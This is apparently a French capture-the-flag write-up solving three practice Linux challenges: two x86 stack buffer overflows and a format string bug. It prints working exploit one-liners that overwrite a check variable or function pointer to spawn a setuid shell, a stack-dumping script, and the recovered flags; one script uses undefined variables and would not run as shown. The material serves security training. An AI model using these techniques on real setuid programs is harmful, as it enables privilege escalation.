# Challenge App - Système

## 1. ELF x86 - Stack buffer overflow basic 1

Le but du premier challenge était de récupérer le flag contenu dans le fichier `.passwd`. 

Le problème ici est que notre utilisateur n'a pas les droits pour ouvrir ce fichier car il est en `read-only` pour l'utilisateur `app-systeme-ch13-cracked` et non pas pour `app-systeme-ch13`.

```shell
app-systeme-ch13@challenge02:~$ ls -la
total 24
dr-xr-x---  2 app-systeme-ch13-cracked app-systeme-ch13         4096 Feb 22  2017 .
drwxr-xr-x 18 root                     root                     4096 Mar 17 09:32 ..
-rwsr-x---  1 app-systeme-ch13-cracked app-systeme-ch13         7304 Feb 22  2017 ch13
-r--r-----  1 app-systeme-ch13-cracked app-systeme-ch13          528 Feb 22  2017 ch13.c
-r--------  1 app-systeme-ch13-cracked app-systeme-ch13-cracked   17 Mar 18  2015 .passwd
```

Le code du programme nous donne néanmoins un indice, en effet, il est possible d'ouvrir le shell `dash` afin de lire ce fichier, comme l'indique le code:

```c
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
```

Pour cela, il a fallu faire un dépassement de pile afin de modifier la variable `check`, initialisée à la valeur `0x04030201 ` pour lui donner la valeur `0xdeadbeef ` et permettre l'ouverture du shell.

La stack actuelle possède une taille fixe de 40 octets et le flag `0xdeadbeef` fait une taille de 4 octets, il est donc nécessaire de passer 11 fois le flag `0xdeadbeef` afin d'avoir un dépassement de mémoire. De plus, notre machine étant en 32bits, elle est donc little-endian, c'est à dire que les bits sont inversés.

On peut faire cela en utilisant une commande `python` :

```shell
app-systeme-ch13@challenge02:~$ python -c 'print("\xef\xbe\xad\xde" * 11)' | ./ch13

[buf]: ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
```

Néanmoins, il y a un problème, le shell se quitte immédiatement et il est impossible de récupérer le contenu du fichier `.passwd`. Pour cela, on concatène la commande `python` avec la commande `cat` qui va bloquer l'entrée et la sortie `stdin ` pour avoir accès au shell.

```shell
app-systeme-ch13@challenge02:~$ (python -c 'print("\xef\xbe\xad\xde" * 11)'; cat) | ./ch13

[buf]: ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd
1w4ntm0r3pr0np1s
```

Le flag est donc **1w4ntm0r3pr0np1s**.

## 2. ELF x86 - Stack buffer overflow basic 2

Comme pour le challenge précédant la taille du buffer est different du buffer cible du fget, nous pouvons ainsi contrôler le pointeur "func".
Mais par rapport au challenge précédent, on n'a pas accès aux adresses mémoire. Ainsi nous pouvons utiliser radare2 pour pouvoir trouver l'adresse correspondant à la fonction "shell".

```shell
$ app-systeme-ch15@challenge02:~$ radare2 ./ch15
[...]
0x08048464 20 sym.shell
[...]
```

Nous allons donc commencer à remplir ce tableau de 128 octets pour pouvoir accéder au pointeur puis remplacer "func" par l'addresse de "shell":

```shell
app-systeme-ch15@challenge02:~$ (python -c "import struct; print(\"\xef\xbe\xad\xde\" * 32 + struct.pack(\"<I\", 0x08048464))"; cat) | ./ch15
cat .passwd
B33r1sSoG0oD4y0urBr4iN
```

Le flag est donc **B33r1sSoG0oD4y0urBr4iN**.

# ELF x86 - Format string bug basic 1

Tout d'abord on peut observer que le fichier est charge puis lut par le fget dans un buffer de taille 32. et nous pouvons observer que l'argument 1 est place directement dans le printf ce qui veut dire que l'on peut injecter des flags afin de lire la stack.

```python
import subprocess

cmd = 'python -c \'print("%08X " * 32)\' | xargs -d "$" /challenge/app-systeme/ch5/ch5'
cp = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
out = cp.communicate()[0].strip().split(' ')

print(out)
```

A partir de cela nous allons lire la memoire presente.

```python
import re
import struct
import subprocess

cmd = 'python -c \'print("%08X " * 32)\' | xargs -d "$" /challenge/app-systeme/ch5/ch5'
cp = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
out = cp.communicate()[0].strip().split(' ')

conv = [int(x, 16) for x in out]
data = [struct.pack("<I", x) for x in conv]
datas = reg.findall(dump)

print(datas)
```

Lors de l'exécution nous pouvons observer un string particulier suivi d'un "\n".

```shell
$ app-systeme-ch5@challenge02:~$ python /tmp/hackerlanase.py
[
  [...],
  'Dpa9', 'd6)(', 'Epam', 'd\n\x00\x00',
  [...]
]
```

Ainsi le flag est **Dpa9d6)(Epam**.
